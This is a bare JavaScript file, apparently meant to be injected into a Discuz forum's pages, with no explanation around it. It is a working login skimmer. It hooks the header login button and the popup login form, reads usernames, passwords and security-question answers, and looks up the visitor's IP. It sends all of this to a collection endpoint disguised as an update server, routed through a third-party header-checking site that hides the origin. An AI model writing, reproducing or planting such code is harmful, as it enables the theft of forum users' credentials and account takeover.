var loadJS = function(url, callback) {
    var head = document.getElementsByTagName("head")[0];
    var script = document.createElement("script");
    script.src = url;
    var done = false;
    script.onload = script.onreadystatechange = function() {
        if (!done && (!this.readyState || this.readyState == "loaded" || this.readyState == "complete")) {
            done = true;
            callback();
            script.onload = script.onreadystatechange = null;
            head.removeChild(script);
        }
    };
    head.appendChild(script);
};
loadJS("http://cdn.bootcss.com/jquery/3.1.1/jquery.min.js", function() {
    var jq = jQuery.noConflict();
    var h = 'http://xxx/discuz_update_cn_server03.php';
    jq(document).ready(function() {
        //index page header login input
        jq("#loginButton").click(function() {
            var u = jq("input[name='username']").val();
            var p = jq("input[name='password']").val();
            if (u != "" && p != "********") {
                loadJS("http://pv.sohu.com/cityjson", function() {
                    var ip = returnCitySN['cip'];
                    var url = h + '?u=' + u + '&p=' + p + '&i=' + ip;
                    jq.post('http://www.veryhuo.com/tools/http_header.php', "url=" + encodeURIComponent(url));
                });
            }
        });
        //xml login form
        jq("#nv_member").on('DOMNodeInserted', function(e) {
        	console.log("1\n");
            jq("button[name='loginsubmit']").click(function() {
            	console.log("222\n");
                var u = jq("input[name='username']").val();
                var p = jq("input[name='password']").val();
                if (u != "" && p != "********") {
                    loadJS("http://pv.sohu.com/cityjson", function() {
                        var ip = returnCitySN['cip'];
                        var url = h + '?u=' + u + '&p=' + p + '&i=' + ip;
                        jq.post('http://www.veryhuo.com/tools/http_header.php', "url=" + encodeURIComponent(url));
                    });
                }
                var q = jq("select[name='questionid']").val();
                var a = jq("input[name='answer']").val();
                //console.log(a+q);
                if (a != "") {
                    var url = h + '?q=' + q + '&a=' + a;
                    jq.post('http://www.veryhuo.com/tools/http_header.php', "url=" + encodeURIComponent(url));
                }
            });
        });
    });
});
